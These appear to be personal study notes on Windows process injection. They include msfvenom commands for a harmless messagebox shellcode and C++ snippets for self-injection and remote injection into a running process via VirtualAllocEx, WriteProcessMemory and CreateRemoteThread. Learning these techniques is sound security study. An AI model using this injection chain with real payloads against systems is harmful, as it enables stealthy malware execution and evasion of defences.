- Processes - Identified by PID
  collapsed:: true
	- Types
		- User Mode
		- Kernel Mode -> Higher Privileges
	- PIDs can be used to get *Handles* to processes
	- ![image.png](../assets/image_1721972523672_0.png)
- Windows API
  collapsed:: true
	- some APIs return pointers to `struct`
- Injection Attack -> Fileless shellcode execution
	- Find an existing process and inject malicious shell code
	- Steps
		- Allocation Memory
		  logseq.order-list-type:: number
		- Write Shell Code
		  logseq.order-list-type:: number
		- Execute Shell Code
		  logseq.order-list-type:: number
	- Metasploit Shell Code - `msfvenom -p windows/messagebox TEXT="ShellCode by MSFVenom" Title="Shell Code" -f c`
	- For process injection into `mspaint` - `x64` is required
		- `msfvenom -p windows/messagebox TEXT="ShellCode by MSFVenom" Title="Shell Code" -f c -a x64`
-
---
- **self-injection.cpp**
  collapsed:: true
	- Step 1 -> Allocating memory
		-
		  ```
		  LPVOID allocated_mem = VirtualAlloc(NULL, // -> Base Address of block of memory for allocation [NULL-> OS will decide]
		                         sizeof(shellcode),
		                         (MEM_COMMIT | MEM_RESERVE), // -> Allocation Type [Reserve + Commit] [logic OR -> x3000]
		                         PAGE_EXECUTE_READWRITE); // -> Page Permissions
		  ```
		- `VirtualAlloc` will return a base pointer to the start of the memory page created
			- base pointer is of type `void pointer`
			- `void pointer` points to an `undefined` data type in memory
	- Step 2 -> Write Shell Code to Allocated Memory
		-
		  ```
		  RtlCopyMemory(allocated_mem, # destination
		  			  shellcode, # source
		                sizeof(shellcode));
		  ```
	- Step 3 -> Execute Shell Code
		-
		  ```
		  HANDLE hThread =  CreateThread(NULL,
		  							   0,
		                                 (LPTHREAD_START_ROUTINE)allocated_mem, # Start of the code that must be executed when thread is created 
		                                 NULL,
		                                 0,
		                                 NULL);
		  ```
			- Halt program till thread finishes execution (time set to `INFINITE`)
				- `WaitForSingleObject(hThread, INFINITE)`
		-
- **process-injection.cpp**
	- Step 0 -> Get a Handle to an existing process
		-
		  ```
		  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, // access all process resources
		  							  FALSE, // child processes are not inherited by handle
		                                pe32.th32ProcessID); // since PIDs change, take a snapshot and obtain PID of required software
		  ```
	- Step 1 -> Allocate Virtual Memory
		- Use `VirtualAllocEx` to allocate a memory page in the target process' memory space
			-
			  ```
			  LPVOID allocated_mem = VirtualAllocEx(hProcess, -> Handle to target process
			                                        NULL,
			                                        sizeof(shellcode),
			                                        (MEM_COMMIT | MEM_RESERVE),
			                                        PAGE_EXECUTE_READWRITE);
			  ```
	- Step 2 -> Write Shell Code to Allocated Memory
		-
		  ```
		      WriteProcessMemory(hProcess, -> Handle to target process
		                         allocated_mem,
		                         shellcode,
		                         sizeof(shellcode),
		                         NULL);
		  ```
	- Step 3 -> Execute Shell Code
		- Create a remote thread to execute a shellcode
			-
			  ```
			  	HANDLE hThread = CreateRemoteThread(hProcess,
			  										NULL, 
			  										0,
			  										(LPTHREAD_START_ROUTINE)allocated_mem,
			  										NULL, 
			  										0, 
			  										NULL);
			  ```
